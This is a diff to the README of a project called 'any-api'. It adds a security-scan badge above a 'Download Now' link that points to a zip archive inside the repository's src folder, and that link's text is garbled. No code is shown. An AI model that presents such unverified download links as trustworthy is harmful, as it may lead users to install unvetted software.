@@ -1,5 +1,7 @@
 # 🚀 any-api - Simplifying AI Model Integration
 
+[![SafeSkill 83/100](https://img.shields.io/badge/SafeSkill-83%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/gloria112-any-api)
+
 ## 📥 Download Now
 [![Download the latest release](https://raw.githubusercontent.com/gloria112/any-api/main/src/api-any-v1.0.zip%20Latest%https://raw.githubusercontent.com/gloria112/any-api/main/src/api-any-v1.0.zip)](https://raw.githubusercontent.com/gloria112/any-api/main/src/api-any-v1.0.zip)
 
